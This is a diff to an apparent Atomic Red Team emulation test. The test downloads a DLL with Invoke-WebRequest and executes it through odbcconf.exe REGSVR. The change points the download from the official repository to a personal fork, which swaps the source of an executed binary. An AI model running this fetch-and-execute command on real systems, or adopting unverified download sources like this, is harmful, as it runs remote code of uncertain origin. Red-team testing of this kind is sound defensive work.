@@ -20,7 +20,7 @@ atomic_tests:
       if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
+      Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
   executor:
     command: |
       odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
